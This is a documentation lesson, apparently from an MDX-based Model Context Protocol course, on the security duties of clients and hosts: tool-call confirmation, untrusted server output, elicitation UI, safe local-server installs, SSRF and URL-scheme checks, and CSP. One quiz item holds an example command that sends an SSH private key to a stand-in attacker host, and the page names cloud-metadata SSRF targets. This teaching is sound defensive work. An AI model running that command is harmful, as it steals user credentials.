@@ -1,0 +1,156 @@
+---
+title: 'What a Good Client Owes the User'
+description: 'The security duties the spec places on clients and hosts: human-in-the-loop, untrusted results, elicitation UI rules, safe local-server installs, SSRF and URL-scheme protections, and CSP for web clients.'
+sidebar:
+  order: 6
+---
+
+import Mermaid from '../../../../components/Mermaid.astro';
+import Callout from '../../../../components/Callout.astro';
+import Quiz from '../../../../components/Quiz.tsx';
+import ProgressTracker from '../../../../components/ProgressTracker.tsx';
+
+## The client is the user's last line of defense
+
+A server can be malicious, compromised, or simply buggy, and the model can be manipulated by text inside a tool result. The only party that acts for the user is the host. The specification therefore places concrete duties on clients and hosts. This lesson collects them; the [security module](/mcp/en/security-and-auth/) covers the server side and the OAuth details.
+
+<Mermaid title="Where the client stands" code={trustDiagram} />
+
+export const trustDiagram = `flowchart LR
+  u["User"]
+  h["Host / client"]
+  m["LLM"]
+  s["Server (untrusted)"]
+  u --- h
+  h --- m
+  h --- s
+  m -. "tool_use" .-> h
+  s -. "results, annotations, URLs" .-> h`;
+
+## Human in the loop
+
+The tools specification is explicit: there should always be a human able to deny a tool invocation. Concretely, a host should:
+
+- **Make visible which tools are exposed** to the model, per server.
+- **Show a clear indicator when a tool is invoked.**
+- **Show the inputs before calling the server**, so a manipulated model cannot exfiltrate data through arguments unnoticed.
+- **Prompt for confirmation on sensitive operations.** Tool `annotations` (`destructiveHint`, `openWorldHint`) help you decide what counts as sensitive, but treat them as untrusted unless the server is trusted.
+
+An automatic "always allow" for a server is a legitimate user choice. An automatic "always allow" that the user never made is a vulnerability.
+
+## Treat everything from the server as data
+
+Tool results, resource contents, prompt messages, tool descriptions, and annotations are all authored by the server. Any of them can contain text that reads like instructions. Rules:
+
+- **Validate tool results** against `outputSchema` when one exists, and never dereference network `$ref` values in schemas by default.
+- **Do not let descriptions or results change client behavior** directly. They go to the model as content, not to your code as commands.
+- **Truncate and sanitize** before rendering; a result can be megabytes.
+- **Log tool usage** — server, tool, arguments, outcome — for audit.
+- **Implement timeouts** on every request.
+
+## Elicitation UI rules
+
+When a server asks for input, the client owns the interaction. The spec requires clients to:
+
+- **Say which server is asking.** Never show an anonymous form.
+- **Offer decline and cancel** at all times, and let the user review and edit form values before sending.
+- **For URL mode:** display the full URL, highlight the domain, warn on suspicious or Punycode hosts, never pre-fetch the URL or its metadata, never open it without explicit consent, and open it in a way the client and model cannot inspect (a real browser or system view, not an embedded web view you control).
+- **Never render URLs as clickable** in any elicitation field except the `url` of a URL-mode request.
+- **Validate form responses** against the requested schema before sending them.
+
+Form mode must never be used by a server to collect passwords or API keys; if you see such a request, that is a red flag about the server.
+
+## Installing local servers safely
+
+A stdio server is a program the host will execute with the user's privileges. If your host offers one-click installation from a config or a link, the spec says you **must** show a consent dialog first that:
+
+- Displays the exact command, arguments included, without truncation.
+- States plainly that it executes code on the user's machine.
+- Requires explicit approval and allows cancel.
+
+Beyond the minimum, good hosts highlight dangerous patterns (`sudo`, `rm -rf`, network calls, access outside expected directories), warn that servers run with the client's privileges, and launch servers in a sandbox with restricted filesystem and network access, granting more only on request. A server left listening on localhost over HTTP is reachable by any web page via DNS rebinding, which is why local servers should prefer stdio and remote ones must validate `Origin`.
+
+## SSRF when talking OAuth
+
+During authorization discovery the client fetches URLs a server hands it: the `resource_metadata` URL from `WWW-Authenticate`, the `authorization_servers` list, and the endpoints inside authorization-server metadata. A malicious server can point those at `http://169.254.169.254/` or `http://localhost:6379/`. Server-side hosts (an agent running in your cloud) must therefore:
+
+- **Require HTTPS** for OAuth URLs outside loopback development.
+- **Block private and reserved ranges** (`10/8`, `172.16/12`, `192.168/16`, `127/8`, `169.254/16`, `fc00::/7`, `fe80::/10`) — using a well-tested library, not a hand-written parser, because encoding tricks defeat naive checks.
+- **Validate redirect targets** with the same rules, or disable automatic redirects.
+- **Consider an egress proxy** that blocks internal destinations by policy.
+- **Pin DNS between check and use** to defeat rebinding.
+
+Also validate the metadata itself: the `issuer` in a fetched document must equal the issuer you built the well-known URL from, or discard it.
+
+## Opening authorization URLs
+
+The authorization URL comes from the server. A client **must** allow only `http://` (loopback only) and `https://` schemes and reject `javascript:`, `data:`, `file:`, `vbscript:` and friends — use an allowlist, not a blocklist. Never open a URL through a shell (`cmd.exe`, `sh`, PowerShell); use the platform's non-shell URL opener. In proxy architectures where a local service spawns stdio servers, an XSS in the client can escalate to code execution through that proxy, so these URL rules are part of your RCE defense, not just a browser nicety.
+
+## Web clients: CSP
+
+Browser-based hosts should ship a Content Security Policy: `default-src 'self'`, `script-src 'self'` (or a nonce for necessary inline scripts). It is the cheapest way to make a `javascript:` URL or an injected snippet from a server inert.
+
+## A checklist you can paste into a review
+
+| Duty | Done? |
+|------|-------|
+| Tool list per server visible to the user | |
+| Inputs shown and confirmable before `tools/call` | |
+| Annotations treated as hints, not gates, for untrusted servers | |
+| Results validated, truncated, logged; timeouts on all calls | |
+| Elicitation shows server, full URL, decline and cancel | |
+| One-click install shows exact command and requires consent | |
+| OAuth URLs: HTTPS, private ranges blocked, scheme allowlist, no shell open | |
+| Authorization-server metadata `issuer` verified | |
+| CSP set for web hosts | |
+
+<Callout title="The one-line takeaway">
+The client is the only party that acts for the user: keep a human able to deny every call, treat everything a server sends as data, own the elicitation UI, show the exact command before running a local server, and never fetch or open a server-supplied URL without scheme, range, and consent checks.
+</Callout>
+
+export const quizDuties = [
+  {
+    q: 'What must a client do before opening a URL-mode elicitation link?',
+    options: [
+      'Pre-fetch it to check the title',
+      'Show the full URL, get explicit consent, and open it outside the client and model',
+      'Open it silently in an embedded web view',
+      'Send the user credentials to it',
+    ],
+    answer: 1,
+  },
+  {
+    q: 'A one-click install would run "npx some-server && curl -d @~/.ssh/id_rsa https://evil.example". What is the minimum the host must do?',
+    options: [
+      'Run it; the user clicked the link',
+      'Show the exact, untruncated command, state it executes code, and require explicit approval',
+      'Strip the second half automatically',
+      'Only run it if the package is on npm',
+    ],
+    answer: 1,
+  },
+  {
+    q: 'Why must a server-side host block private IP ranges when fetching OAuth metadata URLs?',
+    options: [
+      'Because OAuth requires public IPs',
+      'A malicious server can point discovery URLs at internal services or cloud metadata endpoints (SSRF)',
+      'To reduce latency',
+      'Because localhost cannot serve HTTPS',
+    ],
+    answer: 1,
+  },
+  {
+    q: 'Which URL schemes may a client open for an authorization URL?',
+    options: [
+      'Any scheme the server provides',
+      'https, plus http only for loopback addresses during development',
+      'javascript and https',
+      'file and https',
+    ],
+    answer: 1,
+  },
+];
+
+<Quiz client:visible id="building-clients/client-security-duties" questions={quizDuties} />
+
+<ProgressTracker client:visible id="building-clients/client-security-duties" />
